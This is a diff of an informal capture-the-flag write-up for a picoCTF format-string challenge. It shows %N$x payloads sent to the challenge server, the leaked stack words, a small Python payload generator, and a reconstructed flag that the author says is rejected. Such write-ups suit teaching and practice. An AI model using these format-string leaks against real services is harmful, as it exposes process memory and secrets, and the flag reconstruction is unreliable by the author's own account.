@@ -75,4 +75,50 @@ we get
 x%:x:x%:%:x%x%:x:x%:%:x%x%:x:x%:%:x%x%:x:x%:%:x%x%:x:x%:%:x%x%:x:x%:%:x%x%:x:x%:%:x%x%:x:x%:%:x%x%:x:x%:%:x%%:xocip{FTCk43L_gn1g4lFff0_4tS_
 
 of which ocip{FTCk43L_gn1g4lFff0_4tS_ looks like the flag but jumbled
-{k43L_gn1 g4lF ff0_ 4tS _     |  picoCTF{L34king_Fl4g_0ff_St4_}
+{k43L_gn1 g4lF ff0_ 4tS _     |  picoCTF{L34king_Fl4g_0ff_St4_
+
+it seems like im missing a bit of the the flag since it doesnt close the bracket
+
+using this python code
+```bash
+a= _some integer_
+
+for i in range(1,10):
+    b=str(a+i)
+    print("%"+b+"$x:",end='')
+```
+Tell me a story and then I'll tell you one >> %6$x:%7$x:%8$x:%9$x:%10$x:%11$x:%12$x:%13$x:%14$x:
+Here's a story -
+38253a78:253a7824:3a782439:24303125:31253a78:3a782431:24323125:31253a78:3a782433:
+translates to
+8%:x%:x$:x$9$01%1%:x:x$1$21%1%:x:x$3
+
+after a few iterations i got 
+
+%31$x:%32$x:%33$x:%34$x:%35$x:%36$x:%37$x:%38$x:%39$x:
+Here's a story -
+1:eaab4000:8048338:eaa78d20:ea8fdab0:6f636970:7b465443:6b34334c:5f676e31:
+translates to
+ª´8ê§ êÚ°ocip{FTCk43L_gn1
+
+
+Tell me a story and then I'll tell you one >> %36$x:%37$x:%38$x:%39$x:%40$x:%41$x:%42$x:%43$x:%44$x:
+Here's a story -
+6f636970:7b465443:6b34334c:5f676e31:67346c46:6666305f:3474535f:395f6b63:30366635:
+
+translates to
+ocip{FTCk43L_gn1g4lFff0_4tS_9_kc06f5
+
+im still missing a close brackets so i increase the limits
+
+earthwarrior@LAPTOP-VLDN28C5:~$ nc saturn.picoctf.net 55320
+Tell me a story and then I'll tell you one >> %36$x:%37$x:%38$x:%39$x:%40$x:%41$x:%42$x:%43$x:%44$x:%45$x:%46$x:%47$x:%48$x:%49$x:
+Here's a story -
+6f636970:7b465443:6b34334c:5f676e31:67346c46:6666305f:3474535f:395f6b63:30366635:7d373136:fbad2000:a96d3100:0:f336d990:
+translates to
+
+ocip{FTCk43L_gn1g4lFff0_4tS_9_kc06f5}716û­ ©m13m
+
+`ocip {FTC k43L _gn1 g4lF ff0_ 4tS_ 9_kc 06f5 }716`
+rearrages to picoCTF{L34king_Fl4g_0ff_St4ck_95f60617}
+which doesnt seem to work for god knows why
